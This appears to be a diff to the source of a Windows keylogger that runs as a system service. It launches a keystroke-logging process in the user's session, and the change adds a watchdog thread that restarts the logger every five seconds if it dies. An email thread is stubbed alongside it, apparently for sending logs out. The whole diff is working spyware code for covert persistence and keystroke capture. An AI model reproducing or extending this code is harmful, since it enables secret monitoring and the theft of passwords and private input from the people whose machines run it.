@@ -17,9 +17,10 @@ void WINAPI service_handler(DWORD fdwControl);
 
 BOOL RunProcess(LPSTR cmd);
 
-void start_keylog_proc();
-void start_proc();
-void stop_proc();
+bool start_keylog_proc();
+bool stop_keylog_proc();
+void start_service_busi();
+void stop_service_busi();
 DWORD WINAPI keylog_thread(LPVOID info);
 DWORD WINAPI email_thread(LPVOID info);
 bool is_service_env();
@@ -42,7 +43,7 @@ SERVICE_STATUS_HANDLE   hServiceStatusHandle;
 SERVICE_STATUS          ServiceStatus; 
 
 KeyLogManager klm;
-PROCESS_INFORMATION	keylog_proc_info;
+PROCESS_INFORMATION	keylog_proc_info = {0};
 
 int WINAPI _tWinMain(
     HINSTANCE hInstance,
@@ -116,7 +117,7 @@ VOID WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv)
 		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
     } 
 
-	start_proc();
+	start_service_busi();
 }
 
 void keylog_main(){
@@ -124,59 +125,86 @@ void keylog_main(){
 	klm.start();
 }
 
-void start_keylog_proc(){
+bool start_keylog_proc(){
 	char cmd[512] = {0};
 	sprintf(cmd, "%s -k", exe_path);
 	bool ret = ServiceManager::create_process_as_user(cmd, &keylog_proc_info);
 	if(ret) {
 		Sleep(1000);
 		Logger::debug("Start Keylog Proc Succ");
-	}
-	else {
+		return true;
+	}else {
 		Logger::debug("Start Keylog Proc Fail, error code = %d\n", GetLastError()); 
+		return false;
 	}
 }
 
-void stop_keylog_proc(){
+bool stop_keylog_proc(){
 	if(keylog_proc_info.hProcess){
 		PostThreadMessage(keylog_proc_info.dwThreadId, WM_QUIT, 0, 0);
 		Sleep(1000);
-		TerminateProcess(keylog_proc_info.hProcess, 0);
+		BOOL ret = TerminateProcess(keylog_proc_info.hProcess, 0);
+		Logger::debug("Try To Stop Keylog Proc, %d", ret);
 	}
+	keylog_proc_info.hProcess = 0;
+	return true;
 }
 
 DWORD WINAPI keylog_thread(LPVOID info){
-	klm.init(GetCurrentThreadId());
-	klm.start();
+	while(running){
+		Sleep(5000);
+		if(!keylog_proc_info.hProcess){
+			if(start_keylog_proc()){
+				Logger::debug("Start Keylog Proc From Service Succ");
+			}else{
+				Logger::debug("Start Keylog Proc From Service Fail");
+			}
+		} else {
+			DWORD code;
+			GetExitCodeProcess(keylog_proc_info.hProcess, &code);
+			if(code == STILL_ACTIVE){
+				Logger::debug("Check Keylog Proc Succ");
+				continue;
+			}
+			keylog_proc_info.hProcess = 0;
+			if(start_keylog_proc()){
+				Logger::debug("Start Keylog Proc From Service Succ");
+			}else{
+				Logger::debug("Start Keylog Proc From Service Fail");
+			}
+		}	
+	}
+	Logger::debug("Keylog Thread Finish");
+	stop_keylog_proc();
 	return 0;
 }
 
 DWORD WINAPI email_thread(LPVOID info){
 	while(running){
+		Sleep(5000);
 		Logger::debug("Email Thread Running");
-		Sleep(1000);
 	}
+	Logger::debug("Email Thread Finish");
 	return 0;
 }
 
-void start_proc(){
+void start_service_busi(){
+	Logger::debug("Start Service Busi");
 	if(running){
 		return;
 	}
 	running = true;
-	start_keylog_proc();
-	// keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
+	keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
 	email_tid = CreateThread(NULL, 0, email_thread, NULL, 0, NULL);
-	// if(!keylog_tid || !email_tid){
-	if(!email_tid){
-		stop_proc();
+	if(!keylog_tid || !email_tid){
 		Logger::debug("Create Working Thread Fail");
+	} else{
+		Logger::debug("Create Working Thread Succ");
 	}
 }
-void stop_proc(){
+void stop_service_busi(){
+	Logger::debug("Stop Service Busi");
 	running = false;
-	stop_keylog_proc();
-	// klm.stop();
 }
 
 VOID WINAPI service_handler(DWORD fdwControl)
@@ -191,7 +219,7 @@ VOID WINAPI service_handler(DWORD fdwControl)
 			ServiceStatus.dwWaitHint      = 0;
 			// terminate all processes started by this service before shutdown
 			{
-				stop_proc();		
+				stop_service_busi();		
 			}
 			break; 
 		case SERVICE_CONTROL_PAUSE:
